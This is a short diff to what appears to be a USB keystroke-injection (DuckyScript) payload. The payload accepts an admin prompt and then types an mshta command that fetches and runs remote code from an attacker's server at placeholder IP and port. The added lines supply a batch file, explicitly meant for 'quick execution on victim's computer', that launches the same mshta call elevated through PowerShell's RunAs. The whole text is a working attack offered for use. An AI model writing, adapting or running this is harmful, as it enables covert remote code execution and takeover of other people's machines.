@@ -12,7 +12,13 @@ REM This will permit the window to run as an admin
 ALT y
 DELAY 4000
 REM Change the things in the brackets such as your IP address and the port it will communicate through. The subdomain is able to make it unique to only your server (Note that this command will be ran in cmd prompt)
-STRING mshta http://[0.0.0.0]:[PORT]/[anything]
+STRING mshta http://[0.0.0.0]:[PORT]/[string]
 ENTER
 STRING exit
 ENTER
+
+
+REM If you wish to save the script then copy and paste this into notebook and save as a .bat file for quick execution on victim's computer
+ @echo off
+  powershell -Command "Start-Process cmd.exe -ArgumentList '/k', 'mshta http://[0.0.0.0]:[PORT]/[string]', '-noexit' -Verb RunAs"
+exit
